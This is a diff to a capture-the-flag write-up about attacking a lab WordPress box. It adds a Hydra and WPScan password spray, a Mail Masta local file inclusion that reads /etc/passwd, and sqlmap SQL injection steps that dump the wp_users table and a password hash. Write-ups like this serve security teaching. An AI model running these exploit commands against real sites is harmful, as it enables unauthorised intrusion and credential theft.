@@ -190,6 +190,10 @@ msf auxiliary(wordpress_login_enum) > exploit
 ```
 ```
 [+] /wordpress - Found user 'elyana' with id 1
+[...snip...]
+[*] /wordpress/ - WordPress User-Validation - Checking Username:'elyana'
+[+] /wordpress/ - WordPress User-Validation - Username: 'elyana' - is VALID
+
 ```
 #### wordpress/wp-login.php
 * Internet search reveals that default Wordpress credentials are admin / password.
@@ -223,21 +227,149 @@ wpscan --url http://TARGET_IP/Wordpress > wpscan.txt
   * v2.5 is current.
   * No public exploits listed on Exploit db.
 * Mail Masta plugin v1.0.
+  * Vulnerable to [Multiple SQL injection vulnerabilities](https://www.exploit-db.com/exploits/41438).
+    * CVE-2017-6095, CVE-2017-6096, CVE-2017-6097, CVE-2017-6098.
   * Vulnerable to [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/40290) public exploit listed on Exploit db.
 > The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
 * Reflex Gallery 3.1.7.
   * No public exploits listed on Exploit db.
 ## Exploitation
 ### Initial Access
-* password spray "/wordpress/wp-login.php" using Hydra
+* Password spray WordPress using Hydra.
 ```
 hydra -l elyana -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
 ```
+* Password spray WordPress using WPscan.
+```
+# sudo wpscan --password-attack xmlrpc -t 20 -U <username> -P /usr/share/wordlists/rockyou.txt --url <url>
+sudo wpscan --password-attack xmlrpc -t 20 -U elyana  -P /usr/share/wordlists/rockyou.txt --url http://TARGET_IP/wordpress/
+```
 * Exploit Mail Masta LFI vulnerability.
+> "pl" parameter allows inclusion of a file without any type of input validation or sanitisation. Can attempt to include arbitrary files on the webserver. E.g. display contents of /etc/passwd file using cURL.
 ```
-http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+curl -s http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 ```
 ```
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false sshd:x:112:65534::/run/sshd:/usr/sbin/nologin ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash
+mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+ftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 ```
+  * Elyana user is only other user other than root with "/bin/bash" shell access.
+* Exploit Mail Masta SQLi.
+  * Page: ./wp-content/plugins/mail-masta/inc/lists/csvexport.php (Unauthenticated).
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" --dbs
+
+available databases [2]:
+[*] information_schema
+[*] wordpress
+```
+  * `-u` specifies target URL.
+  * `--dbs` tells SQLMap to try to enumerate database.
+* GET Parameter: list_id
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -p list_id
+...
+  * `-p` specifies testable parameter(s).
+```
+Parameter: list_id (GET)
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: list_id=0 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71786b7871,0x554c4e5a557457706f54667a4470616d4161427a4774594c617753474e5945436c61755748507653,0x7170787871),NULL,NULL,NULL,NULL,NULL-- cgoQ&pl=/var/www/html/wordpress/wp-load.php
+```
+* List tables within "wordpress" database.
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress --tables
+
+Database: wordpress
+[23 tables]
++----------------------------+
+| wp_commentmeta             |
+| wp_comments                |
+| wp_links                   |
+| wp_masta_campaign          |
+| wp_masta_cronapi           |
+| wp_masta_list              |
+| wp_masta_reports           |
+| wp_masta_responder         |
+| wp_masta_responder_reports |
+| wp_masta_settings          |
+| wp_masta_subscribers       |
+| wp_masta_support           |
+| wp_options                 |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_reflex_gallery          |
+| wp_reflex_gallery_images   |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_termmeta                |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
++----------------------------+
+```
+* List columns within "wp_users" table.
+```
+sqlmap -u "http://TARGET_IP/wordpress/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0&pl=/var/www/html/wordpress/wp-load.php" -D wordpress -D wordpress -T wp_users --columns
+
+Database: wordpress
+Table: wp_users
+[10 columns]
++---------------------+---------------------+
+| Column              | Type                |
++---------------------+---------------------+
+| display_name        | varchar(250)        |
+| ID                  | bigint(20) unsigned |
+| user_activation_key | varchar(255)        |
+| user_email          | varchar(100)        |
+| user_login          | varchar(60)         |
+| user_nicename       | varchar(50)         |
+| user_pass           | varchar(255)        |
+| user_registered     | datetime            |
+| user_status         | int(11)             |
+| user_url            | varchar(100)        |
++---------------------+---------------------+
+```
+* Dump contents of "wp_users" table.
+```
+Database: wordpress
+Table: wp_users
+[1 entry]
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url                       | user_pass                          | user_login | user_email    | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | http://192.168.8.110/wordpress | $P$BhwVLVLk5fGRPyoEfmBfVs82bY7fSq1 | elyana     | none@none.com | 0           | elyana       | elyana        | 2020-10-05 19:55:50 | <blank>             |
++----+--------------------------------+------------------------------------+------------+---------------+-------------+--------------+---------------+---------------------+---------------------+
+```
+
 ## Privilege Escalation
